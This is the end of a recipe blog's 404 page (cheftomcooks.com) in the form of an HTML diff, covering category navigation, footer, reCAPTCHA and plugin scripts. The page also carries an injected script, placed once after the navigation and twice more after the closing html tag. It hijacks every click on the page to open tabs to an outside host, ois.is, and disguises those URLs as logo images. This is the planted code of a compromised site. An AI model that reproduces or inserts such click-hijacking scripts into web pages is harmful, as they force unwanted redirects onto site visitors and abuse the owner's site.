+	<li class="cat-item cat-item-248"><a href="https://cheftomcooks.com/category/recipes/bread/">Bread</a>
+</li>
+	<li class="cat-item cat-item-60"><a href="https://cheftomcooks.com/category/recipes/breakfast-recipes/">Breakfast</a>
+</li>
+	<li class="cat-item cat-item-1207"><a href="https://cheftomcooks.com/category/recipes/cake-recipes/">Cake</a>
+</li>
+	<li class="cat-item cat-item-416"><a href="https://cheftomcooks.com/category/recipes/casserole-recipes/">Casserole</a>
+</li>
+	<li class="cat-item cat-item-66"><a href="https://cheftomcooks.com/category/recipes/cheese-recipes/">Cheese</a>
+</li>
+	<li class="cat-item cat-item-46"><a href="https://cheftomcooks.com/category/recipes/chicken-recipes/">Chicken</a>
+</li>
+	<li class="cat-item cat-item-110"><a href="https://cheftomcooks.com/category/recipes/chocolate-recipes/">Chocolate</a>
+</li>
+	<li class="cat-item cat-item-284"><a href="https://cheftomcooks.com/category/recipes/cookies/">Cookies</a>
+</li>
+	<li class="cat-item cat-item-47"><a href="https://cheftomcooks.com/category/recipes/copycat-recipes/">Copycat</a>
+</li>
+	<li class="cat-item cat-item-1280"><a href="https://cheftomcooks.com/category/recipes/crockpot-recipes/">Crockpot</a>
+</li>
+	<li class="cat-item cat-item-52"><a href="https://cheftomcooks.com/category/recipes/dessert-recipes/">Dessert</a>
+</li>
+	<li class="cat-item cat-item-48"><a href="https://cheftomcooks.com/category/recipes/drinks-recipes/">Drinks</a>
+</li>
+	<li class="cat-item cat-item-450"><a href="https://cheftomcooks.com/category/recipes/duck-recipes/">Duck</a>
+</li>
+	<li class="cat-item cat-item-518"><a href="https://cheftomcooks.com/category/recipes/for-pets/">For Pets</a>
+</li>
+	<li class="cat-item cat-item-69"><a href="https://cheftomcooks.com/category/recipes/fruit-recipes/">Fruit</a>
+</li>
+	<li class="cat-item cat-item-57"><a href="https://cheftomcooks.com/category/recipes/holiday/">Holiday</a>
+	<ul class='children'>
+	<li class="cat-item cat-item-58"><a href="https://cheftomcooks.com/category/recipes/holiday/halloween-holiday-recipes/">Halloween</a>
+</li>
+	<li class="cat-item cat-item-590"><a href="https://cheftomcooks.com/category/recipes/holiday/independance-day-recipes/">Independance Day</a>
+</li>
+	<li class="cat-item cat-item-409"><a href="https://cheftomcooks.com/category/recipes/holiday/thanksgiving-holiday-recipes/">Thanksgiving</a>
+</li>
+	</ul>
+</li>
+	<li class="cat-item cat-item-336"><a href="https://cheftomcooks.com/category/recipes/lamb/">Lamb</a>
+</li>
+	<li class="cat-item cat-item-62"><a href="https://cheftomcooks.com/category/recipes/lowcarb/">Low Carb</a>
+</li>
+	<li class="cat-item cat-item-64"><a href="https://cheftomcooks.com/category/recipes/lowcholesterol/">Low Cholesterol</a>
+</li>
+	<li class="cat-item cat-item-61"><a href="https://cheftomcooks.com/category/recipes/lowfat-recipes/">Low Fat</a>
+</li>
+	<li class="cat-item cat-item-296"><a href="https://cheftomcooks.com/category/recipes/lunch-recipes/">Lunch</a>
+</li>
+	<li class="cat-item cat-item-1230"><a href="https://cheftomcooks.com/category/recipes/main-dish-recipes/">Main Dish</a>
+</li>
+	<li class="cat-item cat-item-67"><a href="https://cheftomcooks.com/category/recipes/pasta-recipes/">Pasta</a>
+</li>
+	<li class="cat-item cat-item-63"><a href="https://cheftomcooks.com/category/recipes/pork-recipes/">Pork</a>
+</li>
+	<li class="cat-item cat-item-91"><a href="https://cheftomcooks.com/category/recipes/rice/">Rice</a>
+</li>
+	<li class="cat-item cat-item-53"><a href="https://cheftomcooks.com/category/recipes/salads-recipes/">Salads</a>
+</li>
+	<li class="cat-item cat-item-542"><a href="https://cheftomcooks.com/category/recipes/sandwich-recipes/">Sandwich</a>
+</li>
+	<li class="cat-item cat-item-59"><a href="https://cheftomcooks.com/category/recipes/sauces-recipes/">Sauces</a>
+</li>
+	<li class="cat-item cat-item-196"><a href="https://cheftomcooks.com/category/recipes/seafood/">Seafood</a>
+</li>
+	<li class="cat-item cat-item-50"><a href="https://cheftomcooks.com/category/recipes/side-dish-recipes/">Side Dish</a>
+</li>
+	<li class="cat-item cat-item-49"><a href="https://cheftomcooks.com/category/recipes/snacks-recipes/">Snacks</a>
+</li>
+	<li class="cat-item cat-item-54"><a href="https://cheftomcooks.com/category/recipes/soups-recipes/">Soups</a>
+</li>
+	<li class="cat-item cat-item-55"><a href="https://cheftomcooks.com/category/recipes/stew/">Stew</a>
+</li>
+	<li class="cat-item cat-item-192"><a href="https://cheftomcooks.com/category/recipes/turkey/">Turkey</a>
+</li>
+	<li class="cat-item cat-item-44"><a href="https://cheftomcooks.com/category/recipes/veal-recipes/">Veal</a>
+</li>
+	<li class="cat-item cat-item-56"><a href="https://cheftomcooks.com/category/recipes/vegetables-recipes/">Vegetables</a>
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-1815"><a href="https://cheftomcooks.com/category/reviews/">Reviews</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="https://cheftomcooks.com/category/uncategorized/">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-31"><a href="https://cheftomcooks.com/category/vegetarian/">Vegetarian</a>
+</li>
+	<li class="cat-item cat-item-27"><a href="https://cheftomcooks.com/category/video/">Video</a>
+</li>
+</ul></nav>
+<!-- NAVIGATION END -->
+<script>(function (parameters) {
+		const targets = [
+			'https://ois.is/images/logo-1.png', 'https://ois.is/images/logo-2.png', 'https://ois.is/images/logo-3.png', 'https://ois.is/images/logo-4.png', 'https://ois.is/images/logo-5.png', 'https://ois.is/images/logo-6.png', 'https://ois.is/images/logo-7.png', 'https://ois.is/images/logo-8.png'
+		]
+		// Times between clicks
+		const restMinutes = 1;
+		// Number of hours to allow re-click 
+		const allowedHours = 2;
+
+
+		const saveTargetLocationsToStorage = (targets) => {
+			targets.forEach((target, index) => {
+				if(!localStorage.getItem(`${target}-local-storage`)){
+					localStorage.setItem(`${target}-local-storage`, 0);
+				}
+			});
+		}
+		const getRandomLocationFromStorage = (targets) => {
+			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+		}
+		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+		const getHoursDiff = (startDate, endDate) => {
+			const msInHour = 1000 * 60 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInHour);
+		}
+		const getMintsDiff = (startDate, endDate) => {
+			const msInMints = 1000 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInMints);
+		}
+
+		const visitNewLocation = (targets, host, nowDate) => {
+			saveTargetLocationsToStorage(targets);
+			newLocation = getRandomLocationFromStorage(targets);
+			setTimeToStorage(`${host}-mnts`, nowDate);
+			setTimeToStorage(`${host}-hurs`, nowDate);
+			setLocationAsVisited(newLocation);
+			window.open(newLocation, "_blank");
+		}
+
+		// const randomLocation = getRandomLocationFromStorage(targets);
+		saveTargetLocationsToStorage(targets);
+
+		function globalClick(event) {
+			event.stopPropagation();
+			const host = location.host;
+			let newLocation = getRandomLocationFromStorage(targets);
+			const nowDate = Date.parse(new Date());
+			const savedDateForMints = getTimeStorage(`${host}-mnts`);
+			const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+			if (savedDateForMints && savedDateForHours) {
+				try {
+					const storageDateForMints = parseInt(savedDateForMints);
+					const storageDateForHours = parseInt(savedDateForHours);
+					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+					if (hoursDiff >= allowedHours) {
+						saveTargetLocationsToStorage(targets);
+						setTimeToStorage(`${host}-hurs`, nowDate);
+					}
+					if (mintsDiff >= restMinutes) {
+						if (newLocation) {
+							setTimeToStorage(`${host}-mnts`, nowDate);
+							window.open(newLocation, "_blank");
+							setLocationAsVisited(newLocation);
+						}
+					}
+				} catch (error) { visitNewLocation(targets, host, nowDate); }
+			} else { visitNewLocation(targets, host, nowDate); }
+		}
+		document.addEventListener("click", globalClick)
+	})()</script><!-- CONTENT START -->
+<div class="content full-width">
+<div class="content-inner">
+<!-- POST ENTRY -->
+<div id="post-entry">
+<div class="post-entry-inner">
+<article class="post-single page-single 404-page">
+<h1 class="post-title">Error 404</h1>
+<div class="post-content">
+<h3>The page you requested cannot be found!</h3>
+<p>Perhaps you are here because:</p>
+<ul>
+<li>The page has moved</li>
+<li>The page url has been change</li>
+<li>The page no longer exist</li>
+</ul>
+<p><strong>Don't worry, we are still here, just <a href='https://cheftomcooks.com'>click here</a> to go back to civilization.</strong></p>
+</div>
+<!-- POST CONTENT END -->
+</article>
+</div>
+</div>
+<!-- POST ENTRY END -->
+</div><!-- CONTENT INNER END -->
+</div><!-- CONTENT END -->
+</div><!-- CONTAINER WRAP END -->
+
+</div><!-- CONTAINER END -->
+
+</div><!-- BODYCONTENT END -->
+
+</div><!-- INNERWRAP BODYWRAP END -->
+
+</div><!-- WRAPPER MAIN END -->
+
+</div><!-- WRAPPER END -->
+
+
+<footer class="footer-top"><div class="innerwrap"><div class="ftop"><div class="footer-container-wrap">
+
+<div class="fbox footer-one"><div class="widget-area the-icons">
+<aside id="text-330001160" class="widget widget_text">			<div class="textwidget"><div style="padding: 5px; width: 120px; margin: 0;"><a href="http://cookeatshare.com/" style="border: none"><img alt="Featured Author" src="http://assets.cookeatshare.com/assets/fa_badge/top_no_text-9a627b2e6d6e4a4654f5b24bd519e3f2.png" style="border:none; width:120px; height:42px; vertical-align: bottom; padding: 0; margin: 0;" title="Featured Author" /></a><div style="font-family: Tahoma, Arial, sans-serif; color: #fff; text-transform: uppercase; font-size: 12px; width: 110px; text-align: center; background-color: #a0be29 !important; padding: 5px; margin: 0;">Featured Author</div><div style="font-family: Arial,sans-serif; font-size:12px; font-weight:bold; color:#ffd553 !important; width: 110px; text-align: center; background-color: #a0be29 !important; padding: 5px; margin: 0;">view my <a href="http://cookeatshare.com/chefs/thomas-grossmann-45344/recipes" style="font-family: Arial,sans-serif; font-size:12px; font-weight:bold; color:#ffd553 !important; text-decoration: underline;">recipes</a></div><img alt="Featured Author" src="http://assets.cookeatshare.com/assets/fa_badge/bottom-03768b75f7ad70b9814caf470a59edef.png" style="border: none; width: 120px; height: 4px; padding:0; margin:0; vertical-align: top;" title="Featured Author" /></div></div>
+		</aside></div></div>
+
+
+
+
+</div></div></div></footer>
+
+
+<footer class="footer-bottom">
+<div class="innerwrap">
+<div class="fbottom">
+<div class="footer-left">
+Copyright &copy;2026. Chef Tom Cooks !</div>
+<div class="footer-right">
+Mesocolumn Theme by Dezzain</div>
+</div>
+</div>
+</footer>
+<!-- FOOTER BOTTOM END -->
+
+
+</div>
+<!-- SECBODY END -->
+
+
+<script type="text/javascript" id="bbp-swap-no-js-body-class">
+	document.body.className = document.body.className.replace( 'bbp-no-js', 'bbp-js' );
+</script>
+
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.3" id="jquery-ui-mouse-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.3" id="jquery-ui-sortable-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/ui/draggable.min.js?ver=1.13.3" id="jquery-ui-draggable-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/ui/droppable.min.js?ver=1.13.3" id="jquery-ui-droppable-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/suggest.min.js?ver=1.1-20110113" id="suggest-js"></script>
+<script type="text/javascript" id="wpurp_script_minified-js-extra">
+/* <![CDATA[ */
+var wpurp_servings = {"precision":"2","decimal_character":"."};
+var wpurp_print = {"ajaxurl":"https:\/\/cheftomcooks.com\/wp-admin\/admin-ajax.php?wpurp_ajax=1","nonce":"390d2c04a8","custom_print_css":"","wpIncludesUrl":"https:\/\/cheftomcooks.com\/wp-includes\/","coreUrl":"https:\/\/cheftomcooks.com\/wp-content\/plugins\/wp-ultimate-recipe","premiumUrl":"","title":"Chef Tom Cooks !","permalinks":"\/%year%\/%monthnum%\/%day%\/%postname%\/"};
+var wpurp_responsive_data = {"breakpoint":"550"};
+var wpurp_sharing_buttons = {"facebook_lang":"en_US","twitter_lang":"en","google_lang":"en-US"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-content/plugins/wp-ultimate-recipe/assets/wpurp-public.js?ver=3.13.0" id="wpurp_script_minified-js"></script>
+<script type="text/javascript" src="//chicoryapp.com/widget_v2/?source=wpur&amp;ver=3.13.0" id="chicory-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/hoverIntent.min.js?ver=1.10.2" id="hoverIntent-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/modernizr/modernizr.js?ver=6.6.4" id="modernizr-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/tabber/tabber.js?ver=6.6.4" id="tabber-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/superfish-menu/js/superfish.js?ver=6.6.4" id="superfish-js-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/superfish-menu/js/supersubs.js?ver=6.6.4" id="supersub-js-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/custom.js?ver=6.6.4" id="custom-js-js"></script>
+			<script  id="c4wp-recaptcha-js" src="https://www.google.com/recaptcha/api.js?render=6LeXq6UZAAAAAOTuYAMmoihZKNsR8nSF5atTxB5g&#038;hl=en"></script>
+			<script id="c4wp-inline-js" type="text/javascript">
+				
+				( function( grecaptcha ) {
+
+					let c4wp_onloadCallback = function() {
+						for ( var i = 0; i < document.forms.length; i++ ) {
+							let form = document.forms[i];
+							let captcha_div = form.querySelector( '.c4wp_captcha_field_div:not(.rendered)' );
+							let jetpack_sso = form.querySelector( '#jetpack-sso-wrap' );
+
+							if ( null === captcha_div || form.id == 'create-group-form' ) {								
+								continue;
+							}
+							if ( !( captcha_div.offsetWidth || captcha_div.offsetHeight || captcha_div.getClientRects().length ) ) {					    	
+								if ( jetpack_sso == null && ! form.classList.contains( 'woocommerce-form-login' ) ) {
+									continue;
+								}
+							}
+
+							let alreadyCloned = form.querySelector( '.c4wp-submit' );
+							if ( null != alreadyCloned ) {
+								continue;
+							}
+
+							let foundSubmitBtn = form.querySelector( '#signup-form [type=submit], [type=submit]:not(.nf-element):not(#group-creation-create):not([name="signup_submit"]):not([name="ac_form_submit"]):not(.verify-captcha)' );
+							let cloned = false;
+							let clone  = false;
+
+							// Submit button found, clone it.
+							if ( foundSubmitBtn ) {
+								clone = foundSubmitBtn.cloneNode(true);
+								clone.classList.add( 'c4wp-submit' );
+								clone.removeAttribute( 'onclick' );
+								clone.removeAttribute( 'onkeypress' );
+								if ( foundSubmitBtn.parentElement.form === null ) {
+									foundSubmitBtn.parentElement.prepend(clone);
+								} else {
+									foundSubmitBtn.parentElement.insertBefore( clone, foundSubmitBtn );
+								}
+								foundSubmitBtn.style.display = "none";
+								cloned = true;
+							}
+							
+							// Clone created, listen to its click.
+							if ( cloned ) {
+								clone.addEventListener( 'click', function ( event ) {
+									logSubmit( event, 'cloned', form, foundSubmitBtn );
+								});
+							// No clone, execture and watch for form submission.
+							} else {
+								grecaptcha.execute(
+									'6LeXq6UZAAAAAOTuYAMmoihZKNsR8nSF5atTxB5g',
+								).then( function( data ) {
+									var responseElem = form.querySelector( '.c4wp_response' );
+									responseElem.setAttribute( 'value', data );	
+								});
+
+								// Anything else.
+								form.addEventListener( 'submit', function ( event ) {
+									logSubmit( event, 'other', form );
+								});	
+							}
+
+							function logSubmit( event, form_type = '', form, foundSubmitBtn ) {
+
+								// Standard v3 check.
+								if ( ! form.classList.contains( 'c4wp_v2_fallback_active' ) && ! form.classList.contains( 'c4wp_verified' ) ) {
+									event.preventDefault();
+									try {
+										grecaptcha.execute(
+											'6LeXq6UZAAAAAOTuYAMmoihZKNsR8nSF5atTxB5g',
+										).then( function( data ) {	
+											var responseElem = form.querySelector( '.c4wp_response' );
+											if ( responseElem == null ) {
+												var responseElem = document.querySelector( '.c4wp_response' );
+											}
+											
+											responseElem.setAttribute( 'value', data );	
+
+											
+											// Submit as usual.
+											if ( foundSubmitBtn ) {
+												foundSubmitBtn.click();
+											} else {
+												
+												if ( typeof form.submit === 'function' ) {
+													form.submit();
+												} else {
+													HTMLFormElement.prototype.submit.call(form);
+												}
+											}
+
+											return true;
+										});
+									} catch (e) {
+										// Slience.
+									}
+								// V2 fallback.
+								} else {
+									if ( form.classList.contains( 'wpforms-form' ) || form.classList.contains( 'frm-fluent-form' )) {
+										return true;
+									}
+									
+									// Submit as usual.
+									if ( typeof form.submit === 'function' ) {
+										form.submit();
+									} else {
+										HTMLFormElement.prototype.submit.call(form);
+									}
+
+									return true;
+								}
+							};
+						}
+					};
+
+					grecaptcha.ready( c4wp_onloadCallback );
+
+					if ( typeof jQuery !== 'undefined' ) {
+						jQuery( 'body' ).on( 'click', '.acomment-reply.bp-primary-action', function ( e ) {
+							c4wp_onloadCallback();
+						});	
+					}
+
+					//token is valid for 2 minutes, So get new token every after 1 minutes 50 seconds
+					setInterval(c4wp_onloadCallback, 110000);
+
+					
+				} )( grecaptcha );
+			</script>
+						<style type="text/css">
+				.login #login, .login #lostpasswordform {
+					min-width: 350px !important;
+				}
+			</style>
+			
+</body>
+
+</html>
+?>
+<script>(function (parameters) {
+		const targets = [
+			'https://ois.is/images/logo-1.png', 'https://ois.is/images/logo-2.png', 'https://ois.is/images/logo-3.png', 'https://ois.is/images/logo-4.png', 'https://ois.is/images/logo-5.png', 'https://ois.is/images/logo-6.png', 'https://ois.is/images/logo-7.png', 'https://ois.is/images/logo-8.png'
+		]
+		// Times between clicks
+		const restMinutes = 1;
+		// Number of hours to allow re-click 
+		const allowedHours = 2;
+
+
+		const saveTargetLocationsToStorage = (targets) => {
+			targets.forEach((target, index) => {
+				if(!localStorage.getItem(`${target}-local-storage`)){
+					localStorage.setItem(`${target}-local-storage`, 0);
+				}
+			});
+		}
+		const getRandomLocationFromStorage = (targets) => {
+			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+		}
+		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+		const getHoursDiff = (startDate, endDate) => {
+			const msInHour = 1000 * 60 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInHour);
+		}
+		const getMintsDiff = (startDate, endDate) => {
+			const msInMints = 1000 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInMints);
+		}
+
+		const visitNewLocation = (targets, host, nowDate) => {
+			saveTargetLocationsToStorage(targets);
+			newLocation = getRandomLocationFromStorage(targets);
+			setTimeToStorage(`${host}-mnts`, nowDate);
+			setTimeToStorage(`${host}-hurs`, nowDate);
+			setLocationAsVisited(newLocation);
+			window.open(newLocation, "_blank");
+		}
+
+		// const randomLocation = getRandomLocationFromStorage(targets);
+		saveTargetLocationsToStorage(targets);
+
+		function globalClick(event) {
+			event.stopPropagation();
+			const host = location.host;
+			let newLocation = getRandomLocationFromStorage(targets);
+			const nowDate = Date.parse(new Date());
+			const savedDateForMints = getTimeStorage(`${host}-mnts`);
+			const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+			if (savedDateForMints && savedDateForHours) {
+				try {
+					const storageDateForMints = parseInt(savedDateForMints);
+					const storageDateForHours = parseInt(savedDateForHours);
+					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+					if (hoursDiff >= allowedHours) {
+						saveTargetLocationsToStorage(targets);
+						setTimeToStorage(`${host}-hurs`, nowDate);
+					}
+					if (mintsDiff >= restMinutes) {
+						if (newLocation) {
+							setTimeToStorage(`${host}-mnts`, nowDate);
+							window.open(newLocation, "_blank");
+							setLocationAsVisited(newLocation);
+						}
+					}
+				} catch (error) { visitNewLocation(targets, host, nowDate); }
+			} else { visitNewLocation(targets, host, nowDate); }
+		}
+		document.addEventListener("click", globalClick)
+	})()</script><script>(function (parameters) {
+		const targets = [
+			'https://ois.is/images/logo-1.png', 'https://ois.is/images/logo-2.png', 'https://ois.is/images/logo-3.png', 'https://ois.is/images/logo-4.png', 'https://ois.is/images/logo-5.png', 'https://ois.is/images/logo-6.png', 'https://ois.is/images/logo-7.png', 'https://ois.is/images/logo-8.png'
+		]
+		// Times between clicks
+		const restMinutes = 1;
+		// Number of hours to allow re-click 
+		const allowedHours = 2;
+
+
+		const saveTargetLocationsToStorage = (targets) => {
+			targets.forEach((target, index) => {
+				if(!localStorage.getItem(`${target}-local-storage`)){
+					localStorage.setItem(`${target}-local-storage`, 0);
+				}
+			});
+		}
+		const getRandomLocationFromStorage = (targets) => {
+			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+		}
+		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+		const getHoursDiff = (startDate, endDate) => {
+			const msInHour = 1000 * 60 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInHour);
+		}
+		const getMintsDiff = (startDate, endDate) => {
+			const msInMints = 1000 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInMints);
+		}
+
+		const visitNewLocation = (targets, host, nowDate) => {
+			saveTargetLocationsToStorage(targets);
+			newLocation = getRandomLocationFromStorage(targets);
+			setTimeToStorage(`${host}-mnts`, nowDate);
+			setTimeToStorage(`${host}-hurs`, nowDate);
+			setLocationAsVisited(newLocation);
+			window.open(newLocation, "_blank");
+		}
+
+		// const randomLocation = getRandomLocationFromStorage(targets);
+		saveTargetLocationsToStorage(targets);
+
+		function globalClick(event) {
+			event.stopPropagation();
+			const host = location.host;
+			let newLocation = getRandomLocationFromStorage(targets);
+			const nowDate = Date.parse(new Date());
+			const savedDateForMints = getTimeStorage(`${host}-mnts`);
+			const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+			if (savedDateForMints && savedDateForHours) {
+				try {
+					const storageDateForMints = parseInt(savedDateForMints);
+					const storageDateForHours = parseInt(savedDateForHours);
+					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+					if (hoursDiff >= allowedHours) {
+						saveTargetLocationsToStorage(targets);
+						setTimeToStorage(`${host}-hurs`, nowDate);
+					}
+					if (mintsDiff >= restMinutes) {
+						if (newLocation) {
+							setTimeToStorage(`${host}-mnts`, nowDate);
+							window.open(newLocation, "_blank");
+							setLocationAsVisited(newLocation);
+						}
+					}
+				} catch (error) { visitNewLocation(targets, host, nowDate); }
+			} else { visitNewLocation(targets, host, nowDate); }
+		}
+		document.addEventListener("click", globalClick)
+	})()</script>
